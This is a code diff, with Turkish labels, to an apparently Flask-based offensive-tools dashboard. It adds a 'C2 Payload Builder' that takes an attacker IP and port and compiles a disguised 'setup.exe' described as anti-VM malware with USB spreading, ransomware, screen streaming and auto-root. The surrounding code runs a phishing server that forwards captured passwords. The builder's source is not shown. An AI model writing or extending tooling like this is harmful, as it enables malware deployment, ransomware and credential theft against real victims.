@@ -21,6 +21,16 @@ TOOLS_CONFIG = [
         "icon": "fa-robot",
         "tools": [
             {
+                "id": "c2_builder",
+                "name": "C2 Payload Builder (God-Tier)",
+                "path": "RedTeam_C2.py",
+                "desc": "Hedef sistemi ele geçirmek için AES-256 şifreli, Anti-VM korumalı bir EXE virüsü oluşturur. Özellikler: USB Spreader (!spread), Ransomware (!ransom), Ekran Yayını (!stream_start), Auto-Root (!autoroot) ve Self-Destruct (!suicide). (Not: Web arayüzünden tetiklendiğinde standart setup.exe olarak 'stealth_dropper' klasörüne derler.)",
+                "inputs": [
+                    {"name": "lhost", "type": "text", "placeholder": "örn: 192.168.1.10", "label": "Saldırgan IP (LHOST)"},
+                    {"name": "lport", "type": "text", "placeholder": "örn: 443", "label": "Saldırgan Port (LPORT)"}
+                ]
+            },
+            {
                 "id": "autopwn",
                 "name": "Auto-Pwn (Otopilot Sızma Motoru)",
                 "path": "Auto_Pwn.py",
@@ -220,6 +230,35 @@ def api_run():
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         port = cmd_args[0] if len(cmd_args)>0 else "8080"
         return jsonify({"status": "success", "output": f"[*] Phishing Server arka planda başlatıldı!\n[+] Adres: http://localhost:{port}/\n[+] Bildirimler (Notifier.py) aktifse şifreler size iletilecektir."})
+
+    if tool_id == "c2_builder":
+        lhost = args_dict.get("lhost", "")
+        lport = args_dict.get("lport", "")
+        if not lhost or not lport:
+            return jsonify({"status": "error", "output": "LHOST ve LPORT alanları zorunludur!"})
+            
+        sys.path.append(base_dir)
+        try:
+            import RedTeam_C2
+            import threading
+            
+            # C2 Builder'ı arka planda thread olarak başlat
+            def build_thread():
+                RedTeam_C2.c2_payload_builder(
+                    auto_lhost=lhost,
+                    auto_lport=lport,
+                    auto_os='1',
+                    auto_antisb=True,
+                    auto_exename="setup"
+                )
+            
+            threading.Thread(target=build_thread, daemon=True).start()
+            return jsonify({
+                "status": "success", 
+                "output": f"[*] God-Tier Payload oluşturma işlemi başlatıldı.\n[+] Hedef IP: {lhost}\n[+] Port: {lport}\n[+] Lütfen bekleyin. Nuitka derlemesi 1-5 dakika sürebilir.\n[+] İşlem bitince 'stealth_dropper/setup.exe' oluşacaktır."
+            })
+        except Exception as e:
+            return jsonify({"status": "error", "output": f"C2 Builder Başlatılamadı: {e}"})
 
     cmd = [sys.executable, script_path] + cmd_args
     try:
